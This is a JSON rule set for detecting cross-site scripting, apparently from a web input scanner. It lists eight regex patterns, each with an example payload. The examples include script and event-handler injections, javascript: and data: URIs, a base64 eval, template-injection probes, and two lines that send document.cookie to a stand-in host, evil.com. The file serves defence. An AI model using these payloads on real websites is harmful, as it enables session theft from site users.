{
  "category": "Cross-Site Scripting (XSS)",
  "category_id": "xss",
  "severity": "HIGH",
  "score": 65,
  "description": "XSS attacks inject malicious scripts into web pages viewed by other users, enabling session theft, defacement, or malware distribution.",
  "rules": [
    {
      "id": "XSS-001",
      "name": "Script Tag Injection",
      "pattern": "<\\s*script[^>]*>",
      "description": "Detects direct <script> tag injection",
      "example": "<script>alert(document.cookie)</script>",
      "score_modifier": 1.2
    },
    {
      "id": "XSS-002",
      "name": "Event Handler Injection",
      "pattern": "(on(error|load|click|mouseover|focus|blur|submit|change|keydown|keyup|keypress|input|drag|drop|resize|scroll))\\s*=",
      "description": "Detects inline event handlers injected into HTML attributes",
      "example": "<img src=x onerror=alert(1)>",
      "score_modifier": 1.1
    },
    {
      "id": "XSS-003",
      "name": "JavaScript Protocol",
      "pattern": "(javascript|vbscript|livescript)\\s*:",
      "description": "Detects javascript: URI scheme used in href/src attributes",
      "example": "<a href=javascript:alert(1)>",
      "score_modifier": 1.3
    },
    {
      "id": "XSS-004",
      "name": "Data URI XSS",
      "pattern": "data\\s*:\\s*text/(html|javascript)",
      "description": "Detects data: URI used to inject HTML/JS content",
      "example": "<iframe src=data:text/html,<script>alert(1)</script>>",
      "score_modifier": 1.2
    },
    {
      "id": "XSS-005",
      "name": "Tag Attribute Injection",
      "pattern": "<(img|iframe|svg|body|object|embed|link|meta|input|form|button)[^>]*(src|href|action|data|xlink:href)\\s*=",
      "description": "Detects HTML tag injection targeting attribute-based XSS sinks",
      "example": "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>",
      "score_modifier": 1.0
    },
    {
      "id": "XSS-006",
      "name": "Expression/Eval Injection",
      "pattern": "(eval|settimeout|setinterval|function|new\\s+function|window\\[)\\s*\\(",
      "description": "Detects JavaScript execution functions",
      "example": "eval(atob('YWxlcnQoMSk='))",
      "score_modifier": 1.1
    },
    {
      "id": "XSS-007",
      "name": "DOM-based XSS Sinks",
      "pattern": "(document\\.(write|writeln|cookie|location|referrer)|window\\.location|location\\.(href|replace|assign))",
      "description": "Detects access to dangerous DOM properties",
      "example": "document.location='https://evil.com?c='+document.cookie",
      "score_modifier": 1.0
    },
    {
      "id": "XSS-008",
      "name": "Template Injection",
      "pattern": "(\\{\\{[^}]+\\}\\}|\\$\\{[^}]+\\}|<%[^%]+%>)",
      "description": "Detects server-side template injection payloads (can lead to XSS or RCE)",
      "example": "{{7*7}} or ${7*7}",
      "score_modifier": 1.4
    }
  ]
}
